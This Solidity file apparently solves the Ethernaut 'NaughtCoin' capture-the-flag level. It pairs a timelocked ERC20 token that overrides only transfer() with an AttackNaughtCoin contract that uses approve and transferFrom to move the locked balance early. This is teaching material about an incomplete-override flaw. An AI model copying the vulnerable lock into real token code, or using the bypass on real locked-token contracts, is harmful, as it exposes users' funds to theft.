// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
        return true;
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract AttackNaughtCoin {
    NaughtCoin naughtCoin;
    address player = address(this);

    constructor () {
        naughtCoin = new NaughtCoin(player);
    }

    function attack(address receiver) public {
    
        naughtCoin.approve(player, naughtCoin.balanceOf(player));

        // transferFrom 的调用者（即AttackNaughtCoin合约本身）必须是被授权地址(player)
        naughtCoin.transferFrom(player, receiver, naughtCoin.balanceOf(player));
    }

    function balanceOf(address addr) public view returns (uint256) {
        return naughtCoin.balanceOf(addr);
    }    
}